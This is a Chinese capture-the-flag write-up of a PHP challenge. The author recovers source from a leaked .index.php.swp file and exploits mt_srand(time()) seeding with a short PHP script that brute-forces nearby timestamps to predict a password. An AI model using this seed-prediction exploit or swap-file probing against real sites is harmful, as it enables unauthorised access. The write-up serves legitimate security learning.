# 随机数mt_srand--被sublime控制台坑惨了
>湖湘杯复赛

[toc]

## 解题过程
### 目录源码
我和李岩都没发现，最后看wp是
`.index.php.swp`注意前面的那个“点”，忘了是隐藏文件的可能性，长记性！！！得到源码。
```
<?php
error_reporting(0); // 关闭报错，error_reporting(E_ALL)报告所有的错误和警告
$flag = "xxxxxxxxxxxxxxxx";
echo "please input a rand_num !";
function create_password($pw_length =  10){
	$randpwd = "";
	for ($i = 0; $i < $pw_length; $i++){
		$randpwd .= chr(mt_rand(100, 200));
	}
	return $randpwd;
}

session_start();

mt_srand(time());

$pwd=create_password();

echo $pwd.'||';    
if($pwd == $_GET['pwd']){
    echo "first";
    if($_SESSION['userLogin']==$_GET['login'])
    	echo "Nice , you get the flag it is ".$flag ;
}else{
	echo "Wrong!";
}

$_SESSION['userLogin']=create_password(32).rand();

?>
```
### 分析
- 观察到`mt_srand()`函数与`mt_rand()`函数组合，参数是时间戳，可知这个随机数是可以被预测的，当随机数的种子定下后，随机数便以一个固定的序列出现。
- 打印`flag`要过两个判断，第一个是`pwd`由`chr(mt_rand(100, 200))`循环十次生成，第二个`login`的赋值在判断之后，所以为空。只需提交`pwd`即可。

### sublime输出字符问题

#### 可打印ascii字符
一开始拿sublime调试了好久发现连`echo $pwd.'||';`中的||都不输出，才发现又是字符的问题！！！
```
$randpwd .= chr(mt_rand(100, 200)); //可打印的ascii码在32-126之间
```
> sublime控制台什么都打不出来，即使在100-126之间字符在这里因为后续超过127的字符可能被当做delete字符然后把前面打出来的都删掉了（存疑）

平日都是控制台打印payload，然后拿着这一堆送到浏览器里或者hackbar再或者burp里，但是你现在打不出来啊，这可怎么办？？？

#### 解决办法
- 不用sublime控制台输出，用本地服务器运行然后浏览解释输出就行了，于是可以看到正常输出，就是一堆乱码。
- 让`$pwd`这个变量不跑出php，直接在php里利用，然后访问网页，通过`file_get_contents()`函数，参数里放url就好了。

### exp

```
<?php
function create_password($pw_length =  10){
	$randpwd = "";
	for ($i = 0; $i < $pw_length; $i++){
		$randpwd .= chr(mt_rand(100, 200));
	}
	return $randpwd;
}

// 这里的循环参数直接用时间戳的上下浮动作为循环变量，比较巧妙
for($i=time()-10;$i<time()+10;$i++)
{
	mt_srand($i);
	$pwd=create_password();
	$result=file_get_contents("http://127.0.0.1/index.php?pwd=$pwd&login=");
	echo $result.'<br>';
}
?>
```
同样不要用控制台运行，否则可能看不到结果。




## 知识小结

- 花式源码泄漏 `.index.php.swp`
- ascii可打印字符范围
- 字符集的显示
- `mt_srand()`与`mt_rand()`的随机数预测
- `$_SESSION[]`初始化的先后顺序